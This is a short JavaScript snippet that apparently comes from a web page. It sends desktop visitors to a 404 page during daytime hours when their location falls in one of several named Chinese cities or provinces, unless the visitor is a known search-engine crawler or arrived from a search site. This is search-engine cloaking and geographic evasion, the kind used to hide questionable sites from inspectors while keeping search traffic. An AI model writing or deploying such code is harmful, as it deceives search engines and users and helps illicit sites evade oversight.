var province = localAddress.province;
var city = localAddress.city;
if (navigator.userAgent.match(/(Android|iPhone|iPod|iPad|ios|iPadOS)/i)) {} else {
    var ua = navigator.userAgent,
        _r = document.referrer,
        _d = new Date(),
        h = _d.getHours(),
        b = ua.match(/Baiduspider/i) == "Baiduspider",
        s = ua.match(/Sogou/i) == "Sogou",
        so = ua.match(/360Spider/i) == "360Spider",
        sm = ua.match(/Yisouspider/i) == "Yisouspider",
        c = _r.match(/baidu.com/i) == "baidu.com",
        _so = _r.match(/so.com/i) == "so.com",
        _s = _r.match(/sogou.com/i) == "sogou.com",
        _sm = _r.match(/sm.cn/i) == "sm.cn";
    if (!b && !c && !s && !sm && !_s && !_sm && !so && !_so && (h >= 7 && h <= 20)) {
        if (city.indexOf("北京") > -1 || city.indexOf("天津") > -1 || province.indexOf("浙江") > -1 || province.indexOf("广东") >
            -1 || province.indexOf("山东") > -1 || province.indexOf("湖南") > -1 || province.indexOf("河南") > -1 || province
            .indexOf("福建") > -1 || city.indexOf("上海") > -1) {
            window.location.href = "/404.html"
        }
    };
}